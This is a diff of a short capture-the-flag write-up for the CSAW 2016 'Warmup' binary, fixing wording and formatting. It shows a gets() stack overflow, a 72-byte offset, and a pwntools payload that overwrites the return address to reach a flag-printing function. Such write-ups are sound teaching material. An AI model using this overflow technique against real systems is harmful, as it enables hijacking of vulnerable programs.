@@ -1,7 +1,7 @@
 
 # Warmup
 
-`main` function puts the buffer into the vulnerable `gets()` function.
+The `main()` function puts the input buffer into the vulnerable `gets()` function as an argument.
 
 ```c
 void main(void)
@@ -19,7 +19,7 @@ void main(void)
   return;
 ```
 
-There is an `easy` function at `0x40060d` that prints out `flag.txt.
+There is an `easy` function at `0x40060d` that prints out `flag.txt`.
 
 ```shell
 void easy(void)
@@ -59,7 +59,7 @@ Found at offset 72
 The expected payload didn't work
 
 ```
-run < <(python3 -c 'import sys; from pwn import *; sys.stdout.buffer.write(b"A"*72 +  p64(0x40060d))')
+run < <(python3 -c 'import sys; from pwn import *; sys.stdout.buffer.write(b"A"*72 + p64(0x40060d))')
 
 Starting program: /home/wither/NOTES/CSAW/2016/Warmup/warmup < <(python3 -c 'import sys; from pwn import *; sys.stdout.buffer.write(b"A"*72 +  p64(0x40060d))')
 [Thread debugging using libthread_db enabled]
